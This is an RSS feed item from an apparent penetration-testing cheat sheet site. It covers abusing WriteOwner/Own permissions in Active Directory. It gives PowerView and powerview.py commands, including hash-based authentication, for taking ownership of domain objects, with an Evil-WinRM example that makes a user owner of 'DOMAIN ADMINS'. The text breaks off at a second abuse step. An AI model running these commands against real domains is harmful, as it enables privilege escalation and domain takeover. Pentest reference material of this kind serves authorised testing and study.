channel.title: Permissions on TLDRBins
channel.description: Recent content in Permissions on TLDRBins

item.title: WriteOwner/Own
item.description: Abuse #1 : Change Owner of the Group/User Linux Windows 1. Powerview.py # Password sudo ntpdate -s <DC> && powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>' # NTLM sudo ntpdate -s <DC> && powerview '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -H '<HASH>' 2. Change Owner Set-DomainObjectOwner -TargetIdentity '<TARGET_IDENTITY>' -PrincipalIdentity '<TARGET_USER>' 1. Import PowerView . .\PowerView.ps1 *Evil-WinRM* PS C:\Users\maria> . .\PowerView.ps1 2. Change Owner Set-DomainObjectOwner -Identity '<TARGET_IDENTITY>' -OwnerIdentity '<TARGET_USER>' *Evil-WinRM* PS C:\Users\maria> Set-DomainObjectOwner -Identity 'DOMAIN ADMINS' -OwnerIdentity 'maria' Abuse #2 : Add User to the Group Linux Windows 1.
